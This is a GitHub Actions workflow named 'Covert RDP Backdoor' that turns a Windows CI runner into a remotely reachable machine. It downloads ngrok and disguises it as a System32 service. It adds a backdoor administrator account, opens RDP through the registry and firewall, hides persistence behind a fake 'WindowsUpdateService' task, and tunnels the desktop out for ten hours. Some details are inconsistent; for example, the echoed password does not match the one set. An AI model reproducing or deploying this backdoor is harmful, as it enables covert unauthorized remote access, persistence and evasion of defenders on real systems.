name: Covert RDP Backdoor with Secrets

on:
  workflow_dispatch: # يمكن تشغيله يدويًا

jobs:
  establish_foothold:
    runs-on: windows-latest
    env:
      NGROK_AUTH: ${{ secrets.NGROK_AUTH_TOKEN }} # يتم جلب الرمز المميز من الأسرار!
      RDP_USER: Ramy
      RDP_PASS: Ramy123

    steps:
      - name: Stage Ngrok (Stealthy Download)
        run: |
          $tempDir = New-Item -Path $env:TEMP -Name "temp_ngrok_stage" -ItemType Directory -Force
          Set-Location $tempDir
          Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "ngrok.zip"
          Expand-Archive "ngrok.zip" -DestinationPath . -Force
          .\ngrok.exe authtoken $env:NGROK_AUTH
          Move-Item -Path .\ngrok.exe -Destination "C:\Windows\System32\ngrok_service.exe" -Force
          Remove-Item -Path "ngrok.zip", "LICENSE", "README.md" -ErrorAction SilentlyContinue -Force # <-- التعديل هنا!
          Set-Location C:\
        shell: pwsh

      - name: Create Stealthy RDP User & Admin Privileges
        run: |
          # 1. Choose a stronger password that meets policy and avoids interactive prompt
          # Max length for "net user" without prompt is often 14 characters.
          net user "Ramy" "R@myPass123!A" /add /expires:never /active:yes # 14 characters
          
          # 2. Add a small delay and then add the user to administrators group
          Start-Sleep -Seconds 2 # Give Windows a moment to register the new user
          net localgroup administrators "Ramy" /add
          
          # Enable RDP connections via Registry (more direct)
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp' -Name 'UserAuthentication' -Value 1 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'PortNumber' -Value 3389 -Force
          
          # 3. Allow RDP through Firewall (removed -Force parameter)
          New-NetFirewallRule -DisplayName "Allow RDP Access - Covert" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Program "%SystemRoot%\system32\svost.exe" -EdgeTraversalPolicy Allow
        shell: pwsh

      - name: Establish Ngrok Tunnel for RDP (Persistent)
        run: |
          $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\ngrok_service.exe" -Argument "tcp 3389 --log=nul"
          $trigger = New-ScheduledTaskTrigger -AtStartup
          Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Description "Maintains critical Windows services." -Force
          
          # تعديل هنا: تشغيل ngrok بطريقة تطبع المخرجات إلى ملف، ثم طباعة محتوى الملف
          Start-Process "C:\Windows\System32\ngrok_service.exe" -ArgumentList "tcp 3389 --log=log.txt --log-level=info" -NoNewWindow -PassThru | Out-Null
          Start-Sleep -Seconds 5 # أعط ngrok بعض الوقت لكتابة الملف
          Get-Content "log.txt" # هذا سيطبع محتوى log.txt إلى سجلات GitHub Actions
          
          Start-Sleep -Seconds 10 # هذا كان موجودًا بالفعل، يمكن الاحتفاظ به أو تعديله
          
          echo "Ngrok tunnel for RDP is now active. Use username 'Ramy' and password 'Ramy123'."
          echo "Check GitHub Actions logs for the public Ngrok URL to connect."
          echo "You will find the URL in the log output, it will look something like: tcp://0.tcp.ngrok.io:XXXXX"
        shell: pwsh

      - name: Keep Workflow Running (for tunnel persistence)
        run: |
          Start-Sleep -Seconds 36000 # Keep alive for 10 hours
        shell: pwsh
